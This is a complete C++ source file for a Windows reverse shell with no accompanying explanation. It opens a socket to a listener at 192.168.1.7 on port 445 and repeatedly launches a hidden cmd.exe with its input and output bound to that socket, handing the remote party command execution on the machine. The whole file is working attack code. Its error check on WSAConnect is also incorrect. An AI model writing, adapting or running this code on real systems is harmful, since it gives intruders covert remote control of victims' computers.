#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <processthreadsapi.h>
#include <ws2tcpip.h>
#include <ws2ipdef.h>
#include <stdio.h> // printf
#include <string.h> // strlen
#include <string> // string
#pragma comment(lib, "ws2_32.lib")


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Setting up Winsocket //  
    sockaddr_in connecter{};
    WSAData wsaData;
    SOCKET socket;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si{};
    int port = 445;
    char ipaddr[] = "192.168.1.7";

    // Initialize Winsocket Library
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    // Socket Creation // 
    socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    // Socket Connection To Listener // 
    connecter.sin_family = AF_INET; // Transport Protocols
    connecter.sin_port = htons(port); // Port Number
    inet_pton(connecter.sin_family, ipaddr, &connecter.sin_addr.s_addr); // IP Adress Configuration
    // Connect To Listener // 
    if (WSAConnect(socket, (struct sockaddr*)&connecter, sizeof(connecter), NULL, NULL, NULL, NULL) == 1) {
        printf("Socket Connection Error");
        return 1;
    }
    else {
        // Buffer for Socket 
        char space[4096];
        while (true) {
            // Receiving Bytes for Cmd Commands
            int receivedBytes = recv(socket, space, sizeof(space), 0);
            // Set Input/Output Memory Clearance
            SecureZeroMemory(&si, sizeof(si));
            // Create Process and Execute Command // 
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;
            si.wShowWindow = SW_HIDE;
            char commander[] = ("cmd.exe");
            CreateProcessA(NULL, commander, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

            WaitForSingleObject(pi.hProcess, INFINITE);
            // Close process and thread handles. 
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);

        }
    }

    return 0;
}
